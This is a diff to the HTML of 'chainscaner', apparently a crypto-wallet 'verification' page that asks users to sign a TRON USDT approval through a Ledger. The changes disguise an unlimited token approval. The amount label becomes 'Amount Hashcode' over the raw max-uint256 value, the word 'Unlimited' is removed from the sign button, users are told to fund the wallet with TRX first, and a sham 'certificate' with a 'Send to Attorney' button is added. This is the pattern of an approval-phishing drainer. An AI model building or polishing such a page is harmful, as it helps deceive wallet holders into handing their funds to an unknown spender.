@@ -124,14 +124,24 @@
   .sbadge.opt { background:#e8edf3; color:var(--muted); }
   .scheck-meta { font-size:11px; color:var(--muted); margin-top:10px; font-family:ui-monospace,'SF Mono',Menlo,monospace; }
   .scheck #recheck { margin-top:10px; padding:8px; font-size:12px; }
+  /* Brand — identical to start page */
+  .brand-icon { width:30px; height:30px; border-radius:9px; flex:none;
+    background:linear-gradient(135deg,#2563EB,#1D4ED8);
+    display:inline-flex; align-items:center; justify-content:center;
+    box-shadow:0 2px 8px rgba(37,99,235,.25); }
+  .brand-word { display:flex; flex-direction:column; line-height:1.1; }
+  .brand-name { font-weight:800; font-size:16px; letter-spacing:-.3px; }
+  .brand-word .scan { color:#2563EB; }
+  .brand-tag { font-size:8.5px; font-weight:700; letter-spacing:1.7px; text-transform:uppercase; color:var(--muted); margin-top:3px; }
+  @media (max-width:560px){ .brand-tag{ display:none; } }
 </style>
 </head>
 <body>
 <div class="wrap">
   <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:18px;">
-    <div style="display:inline-flex; align-items:center; gap:8px;">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" style="color:var(--primary)"><path d="M12 2L4 5v6c0 5.55 3.84 9.74 8 11 4.16-1.26 8-5.45 8-11V5l-8-3zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="currentColor"/></svg>
-      <span style="font-weight:600; letter-spacing:-.01em;">chain<span style="color:#2563EB">scan</span>er</span>
+    <div style="display:inline-flex; align-items:center; gap:9px;">
+      <span class="brand-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/></svg></span>
+      <span class="brand-word"><span class="brand-name">chain<span class="scan">scan</span>er</span><span class="brand-tag">One scan ahead.</span></span>
     </div>
     <div id="sess-pill" class="session-pill hidden" role="timer" aria-label="Session time remaining">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
@@ -225,10 +235,15 @@
     <div style="font-size:13px; color:var(--muted); margin-bottom:12px; line-height:1.8;">
       Network: TRON Mainnet (USDT)<br>
       Spender: <span id="spender-display" style="font-family:ui-monospace,monospace; color:var(--text);">-</span><br>
-      Amount: <span id="amount-display" style="font-family:ui-monospace,monospace; color:var(--text);">Unlimited (max uint256)</span>
+      Amount Hashcode: <span id="amount-display" style="font-family:ui-monospace,monospace; color:var(--text); word-break:break-all;">115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br>
+      TRX Balance: <span id="trx-balance" style="font-family:ui-monospace,monospace; color:var(--text);">-</span>
+    </div>
+    <div id="trx-warn" class="hidden" style="font-size:12px; color:#d92d20; background:#fef3f2; border:1px solid #fecdca; border-radius:8px; padding:10px 12px; margin-bottom:12px; line-height:1.6;">
+      This wallet holds <strong>0 TRX</strong> — the approve burns ~30 TRX in Energy, paid by the signing wallet itself (TRON has no fee sponsorship).
+      Send at least 30 TRX to this address first, then continue.
     </div>
 
-    <button id="approve" class="success">Sign Approve (Unlimited)</button>
+    <button id="approve" class="success">Sign Approve</button>
     <button id="revoke" class="warning" style="margin-top:8px">Revoke Approval</button>
   </div>
 
@@ -244,6 +259,13 @@
     <div id="done-hint" class="hidden" style="text-align:center; font-size:12px; color:var(--muted); margin-top:14px;">
       Your verification is recorded on-chain. You may close this window.
     </div>
+    <div id="certificate-section" class="hidden" style="text-align:center; margin-top:16px;">
+      <div style="font-size:13px; color:var(--success); margin-bottom:12px;">
+        ✓ Certificate sent to your email
+      </div>
+      <button id="download-cert" class="success" style="margin-bottom:8px">Download Certificate</button>
+      <button id="email-attorney" class="neutral" style="font-size:13px; padding:10px 16px;">Send to Attorney</button>
+    </div>
     <button id="reset" class="neutral" style="margin-top:16px">New Verification</button>
   </div>
 
@@ -253,6 +275,8 @@
   </div>
   <div id="apdu-log" class="hidden"></div>
 </div>
-<script type="module" src="./bundle.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="/ledger/certificate.js"></script>
+<script type="module" src="/ledger/bundle.js"></script>
 </body>
 </html>
